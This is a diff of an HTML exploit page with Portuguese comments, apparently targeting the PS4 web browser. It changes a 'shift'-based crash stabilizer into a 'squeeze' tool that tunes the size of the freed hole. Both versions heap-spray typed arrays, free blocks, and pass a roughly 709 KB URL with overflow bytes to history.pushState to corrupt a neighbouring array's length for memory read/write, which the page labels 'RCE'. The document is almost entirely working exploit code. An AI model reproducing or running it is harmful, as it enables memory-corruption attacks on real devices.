@@ -1,148 +1,132 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 RCE Stabilizer</title>
+    <title>The Squeeze: Dynamic Hole Resizing</title>
     <style>
-        body { background: #111; color: #0f0; font-family: monospace; font-size: 14px; }
-        .btn { padding: 10px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; margin: 5px; }
-        .log { border: 1px solid #444; height: 300px; overflow: auto; padding: 10px; margin-top: 10px; background: #000; }
-        .danger { color: #ff3333; }
-        .success { color: #00ff00; font-weight: bold; background: #003300; }
+        body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
+        .log { border: 1px solid #333; height: 350px; overflow-y: scroll; padding: 10px; background: #000; margin-top: 15px; }
+        .controls { background: #1a1a1a; padding: 15px; border: 1px solid #444; }
+        input { background: #333; color: #fff; border: 1px solid #555; padding: 5px; width: 60px; text-align: center; }
+        button { background: #004400; color: #fff; border: 1px solid #006600; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #006600; }
+        .warning { color: #ffaa00; }
+        .critical { color: #ff3333; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>Crash Stabilizer & Isolation</h1>
-    <p>Target: 709,522 bytes | Strategy: Metadata Shifting</p>
-
-    <div>
-        <button class="btn" onclick="runTest(0)">Shift 0 (Padrão)</button>
-        <button class="btn" onclick="runTest(4)">Shift 4 bytes</button>
-        <button class="btn" onclick="runTest(8)">Shift 8 bytes</button>
-        <button class="btn" onclick="runTest(16)">Shift 16 bytes</button>
-        <button class="btn" onclick="runTest(24)">Shift 24 bytes</button>
+    <h1>Strategy: The Squeeze (Apertar o Buraco)</h1>
+    <p>Objetivo: Reduzir o buraco até o payload tocar o próximo Array.</p>
+    
+    <div class="controls">
+        <label>Tamanho do Buraco (em nº de Arrays deletados):</label>
+        <input type="number" id="holeSize" value="175">
+        <button onclick="runSqueeze()">TESTAR ESTE TAMANHO</button>
+        <br><br>
+        <small>Dica: Reduza este número de 1 em 1 (175, 174, 173...) até crashar ou dar sucesso.</small>
     </div>
 
-    <div id="logger" class="log"></div>
+    <div id="logger" class="log">Ready.</div>
 
     <script>
         const logger = document.getElementById('logger');
         function log(msg, type='') {
-            const div = document.createElement('div');
-            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            if(type) div.className = type;
-            logger.appendChild(div);
+            const d = document.createElement('div');
+            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            if(type) d.className = type;
+            logger.appendChild(d);
             logger.scrollTop = logger.scrollHeight;
         }
 
-        // DADOS DO REPORT ORIGINAL
-        const BOUNDARY = 709522; 
-        
-        // Overflow curto. Não queremos 340KB! 
-        // Queremos apenas o suficiente para pegar o Header (geralmente 8 a 16 bytes).
-        // Se escrevermos demais, crashamos o kernel.
-        const OVERFLOW_LEN = 32; 
+        // PARÂMETROS
+        const PAYLOAD_BASE = 709522; 
+        const OVERFLOW_BYTES = 64; // Vamos tentar escrever 64 bytes além do limite
+        const CHUNK_SIZE = 0x1000; // 4096 bytes (tamanho de cada array usado para medir)
 
-        var sprayPtrs = [];
+        var spray = [];
 
-        function runTest(shiftAmount) {
-            log(`--- Iniciando Teste com SHIFT: ${shiftAmount} bytes ---`);
-            log("Limpando memória antiga...");
-            sprayPtrs = []; // Reseta
+        async function runSqueeze() {
+            let holeCount = parseInt(document.getElementById('holeSize').value);
             
-            setTimeout(() => {
-                stabilizeHeap(shiftAmount);
-            }, 200);
-        }
-
-        function stabilizeHeap(shift) {
-            log("1. Executando Heap Spray com Padding Variável...");
+            log("------------------------------------------------");
+            log(`INICIANDO TESTE: Buraco de ${holeCount} blocos (~${(holeCount * 4096) / 1024} KB)`);
             
-            // FASE 1: SPRAY ALINHADO
-            // O objetivo aqui é colocar objetos na memória que tenham um tamanho ligeiramente diferente
-            // para que o cabeçalho deles "corra" para o lado, fugindo (ou buscando) o nosso byte de overflow.
+            // 1. Limpeza
+            spray = [];
+            if(window.gc) window.gc();
             
-            for(let i=0; i < 4000; i++) {
-                // Tamanho base + Shift
-                // Uint32Array(1024) = 4096 bytes.
-                // Adicionamos 'shift' elementos extras para empurrar o layout.
-                let size = 1024 + shift; 
-                let arr = new Uint32Array(size);
-                
+            // 2. Heap Spray (Preencher a RAM)
+            log("1. Alocando Spray (Definindo vizinhos)...");
+            for(let i=0; i < 5000; i++) {
+                // Array de 4KB (1024 * 4 bytes)
+                let arr = new Uint32Array(1024);
                 arr[0] = 0x13371337; // Marker
-                arr[1] = i;          // Index
-                sprayPtrs.push(arr);
+                arr[1] = i;          // Index pra gente saber qual corrompeu
+                spray.push(arr);
             }
 
-            log("2. Criando o 'Buraco de Isolamento'...");
+            // 3. Criar o Buraco (The Hole) com o tamanho escolhido
+            log(`2. Criando buraco de tamanho ${holeCount}...`);
             
-            // Precisamos de um buraco GRANDE e CONTÍGUO para o payload de 709KB.
-            // Se o buraco for perfeito, o payload termina exatamente onde começa o próximo array.
+            // Vamos criar buracos em várias regiões para garantir que o allocator ache um
+            let targetIndexes = [1000, 2000, 3000];
             
-            // Baseado no seu crash anterior, vamos deletar blocos de arrays.
-            // 709522 bytes / (4096 + shift*4) bytes = N arrays a deletar.
-            // Cálculo aproximado: ~173 arrays de 4KB.
-            
-            // Vamos tentar criar buracos em 3 lugares diferentes da memória para aumentar a chance
-            let holes = [1000, 2000, 3000];
-            
-            for(let h of holes) {
-                // Deletamos 175 arrays seguidos para garantir espaço
-                for(let i=0; i < 175; i++) {
-                    sprayPtrs[h + i] = null;
+            for(let startIdx of targetIndexes) {
+                for(let i=0; i < holeCount; i++) {
+                    // Libera os arrays para criar o espaço vazio
+                    spray[startIdx + i] = null;
                 }
             }
 
-            log("3. Aguardando GC e Injetando Payload...");
+            // Pausa para o GC limpar e consolidar o buraco
+            log("3. Aguardando Garbage Collector...");
+            await new Promise(r => setTimeout(r, 600));
+
+            // 4. Injeção
+            log(`4. Injetando Payload (${PAYLOAD_BASE} + ${OVERFLOW_BYTES} bytes)...`);
             
-            setTimeout(() => {
-                try {
-                    // CONSTRUÇÃO DO PAYLOAD (Baseado no seu POC)
-                    const base = "A".repeat(BOUNDARY);
-                    
-                    // O Overflow Controlado (0x01)
-                    // Usamos 0x01 porque passa pelo filtro do WebKit
-                    const overflow = "\x01".repeat(OVERFLOW_LEN);
-                    
-                    const payload = "/" + base + overflow; // '/' as vezes ajuda a alinhar strings de URL
+            try {
+                let base = "A".repeat(PAYLOAD_BASE);
+                // Overflow com 0x01 (tenta aumentar o length do vizinho)
+                let overflow = "\x01".repeat(OVERFLOW_BYTES); 
+                let finalPayload = "/" + base + overflow;
 
-                    // INJEÇÃO
-                    history.pushState({}, "rce_attempt", payload);
-                    
-                    // CHECAGEM
-                    checkSuccess(shift);
-
-                } catch(e) {
-                    log("Erro na injeção: " + e.message, "danger");
-                }
-            }, 500);
+                history.pushState({}, "squeeze_" + holeCount, finalPayload);
+                
+                // 5. Verificação
+                checkCorruption(holeCount);
+                
+            } catch(e) {
+                log("Erro na execução: " + e.message, "critical");
+            }
         }
 
-        function checkSuccess(shift) {
-            log("Verificando integridade dos Arrays...");
-            let corrupted = false;
-
-            for(let i=0; i < sprayPtrs.length; i++) {
-                let arr = sprayPtrs[i];
+        function checkCorruption(holeUsed) {
+            let found = false;
+            // Verifica arrays sobreviventes
+            for(let i=0; i < spray.length; i++) {
+                let arr = spray[i];
                 if(arr) {
-                    // Verifica se o tamanho mudou
-                    let expectedSize = 1024 + shift;
-                    
-                    // Se o tamanho for diferente do original, BINGO!
-                    if(arr.length !== expectedSize) {
-                        corrupted = true;
-                        log("!!! SUCESSO CRÍTICO !!!", "success");
-                        log(`Array ${i} corrompido! Shift usado: ${shift}`, "success");
-                        log(`Tamanho antigo: ${expectedSize} -> Novo: ${arr.length}`, "success");
-                        log("MEMÓRIA RW ALCANÇADA. NÃO FECHE ESTA PÁGINA.", "success");
-                        alert("RCE FOUND! Take a picture!");
+                    // Se o tamanho não for 1024, foi modificado!
+                    if(arr.length !== 1024) {
+                        found = true;
+                        log("!!! SUCESSO !!!", "success");
+                        log(`Array ${i} CORROMPIDO!`, "success");
+                        log(`Tamanho do Buraco Ideal: ${holeUsed}`, "success");
+                        log(`Novo tamanho do array: ${arr.length}`, "success");
+                        document.body.style.background = "green";
+                        alert("RCE UNLOCKED! Hole Size: " + holeUsed);
                         return;
                     }
                 }
             }
 
-            if(!corrupted) {
-                log(`Falha com Shift ${shift}. Nenhum array modificado.`, "danger");
-                log("Se não crashou, o overflow caiu no vazio (padding). Tente outro Shift.");
+            if(!found) {
+                log(`Resultado: Nada aconteceu com tamanho ${holeUsed}.`, "warning");
+                log(`O buraco ainda está muito grande. Tente ${holeUsed - 1}.`);
+                
+                // Auto-sugestão no botão (opcional)
+                let nextVal = holeUsed - 1;
+                document.getElementById('holeSize').value = nextVal;
             }
         }
     </script>
